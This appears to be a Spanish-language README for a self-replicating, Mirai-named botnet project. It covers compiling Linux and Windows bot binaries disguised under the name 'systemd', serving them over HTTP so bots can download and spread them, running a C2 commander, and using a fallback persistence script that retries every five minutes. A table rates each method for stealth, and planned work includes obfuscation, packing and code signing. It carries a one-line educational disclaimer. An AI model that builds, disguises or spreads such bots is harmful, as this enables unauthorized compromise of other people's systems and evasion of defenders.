# 🌟 BOT UNIVERSAL - COMPILACIÓN MULTIPLATAFORMA

## 📋 RESUMEN

Tu bot ahora soporta **detección automática de plataforma** y se replica usando el binario correcto según el sistema objetivo:

- **Linux x86_64** → `systemd` (ELF binario)
- **Windows x64** → `systemd.exe` (PE binario)  
- **Fallback** → Replicación via código Python

---

## 🚀 COMPILACIÓN RÁPIDA

### Opción 1: Compilación Universal (Windows + Linux)
```batch
COMPILE_UNIVERSAL.bat
```
**Requisitos:**
- Python 3.x
- Docker Desktop (para Linux)

**Resultado:**
- `bots/windows/x64/systemd.exe` ✅
- `bots/linux/x86_64/systemd` ✅

---

### Opción 2: Solo Windows (rápido)
```batch
COMPILE_NOW.bat
```
Luego copia manualmente:
```batch
copy dist\systemd.exe bots\windows\x64\systemd.exe
```

---

### Opción 3: Solo Linux (requiere Docker)
```batch
compile_linux_bot.bat
```

---

## 🔧 CÓMO FUNCIONA

### 1. Detección Automática
El bot detecta el sistema objetivo:
```python
if os_type == 'linux':
    binary_name = "systemd"        # → Descarga binario Linux
elif os_type == 'darwin':
    binary_name = "systemd-macos"  # → Descarga binario macOS
else:
    # Usar Python fallback
```

### 2. Métodos de Replicación (en orden)
1. **Binario nativo** → Rápido, no requiere Python
2. **Código Python** → Fallback si binario falla
3. **Script persistente** → Último recurso, re-intenta cada 5 min

### 3. Servidor HTTP
```batch
start_binary_server.bat
```
Sirve automáticamente todos los binarios disponibles:
- `http://localhost:8000/systemd` (Linux)
- `http://localhost:8000/systemd.exe` (Windows)
- `http://localhost:8000/bot_soldier.py` (Python)

---

## 📦 ESTRUCTURA DE BINARIOS

```
mirai/
├── bots/
│   ├── linux/
│   │   └── x86_64/
│   │       └── systemd          ← ELF 64-bit (para Docker/VMs Linux)
│   └── windows/
│       └── x64/
│           └── systemd.exe      ← PE 64-bit (para Windows)
├── bot_soldier.py               ← Código fuente (fallback)
└── systemd / systemd.exe        ← Copias para servidor HTTP
```

---

## ✅ VERIFICACIÓN

### 1. Verificar compilación
```batch
diagnose.bat
```

### 2. Verificar tipo de binario

**Linux:**
```bash
file bots/linux/x86_64/systemd
# Debe mostrar: ELF 64-bit LSB executable
```

**Windows:**
```powershell
Get-Content "bots\windows\x64\systemd.exe" -Encoding Byte -TotalCount 2
# Debe mostrar: 4D 5A (MZ header)
```

---

## 🎯 FLUJO COMPLETO

### Terminal 1: Servidor HTTP
```batch
start_binary_server.bat
```

### Terminal 2: C2 Commander
```batch
python c2_commander.py
```

### Terminal 3: Bot Test
```batch
test_binary.bat
```

---

## 🐛 SOLUCIÓN DE PROBLEMAS

### "BINARY_DOWNLOAD_FAIL" en Linux
**Causa:** Binario es Windows (.exe) en vez de Linux (ELF)

**Solución:**
```batch
COMPILE_UNIVERSAL.bat
```

### "BINARY_EXEC_FAIL"
**Causa:** Binario descargado pero no puede ejecutarse

**Posibles razones:**
1. Arquitectura incorrecta (ARM vs x86)
2. Permisos de ejecución
3. Librerías faltantes

**Solución:** El bot automáticamente usa fallback a Python

### Docker no disponible
**Solución temporal:** Usa solo replicación Python:
- El bot automáticamente detecta que binario Linux no existe
- Salta directo al método Python
- Funciona pero es más lento

---

## 📊 COMPARACIÓN DE MÉTODOS

| Método | Velocidad | Requisitos | Sigilo |
|--------|-----------|------------|--------|
| **Binario nativo** | ⚡⚡⚡ Rápido | Ninguno | ⭐⭐⭐ Alto |
| **Python** | ⚡⚡ Medio | Python instalado | ⭐⭐ Medio |
| **Script persistente** | ⚡ Lento | bash/sh | ⭐ Bajo |

---

## 🔐 NOTAS DE SEGURIDAD

⚠️ **IMPORTANTE:** Este código es para **fines educativos** en **entornos controlados**.

- Usa solo en tus propios contenedores Docker
- No uses en redes de producción
- No distribuyas binarios sin permiso

---

## 💡 MEJORAS FUTURAS

- [ ] Compilación para ARM64 (Raspberry Pi)
- [ ] Compilación para macOS (M1/M2)
- [ ] Ofuscación de binarios
- [ ] Compresión UPX
- [ ] Firma de código

---

## 📝 LOGS

Verifica logs del bot replicado:
```bash
# Dentro del contenedor Docker
docker exec vulnerable_ssh_1 cat /tmp/.bot.log
docker exec vulnerable_ssh_1 ps aux | grep svc
```

---

¿Problemas? Ejecuta `diagnose.bat` para ver el estado completo del sistema.
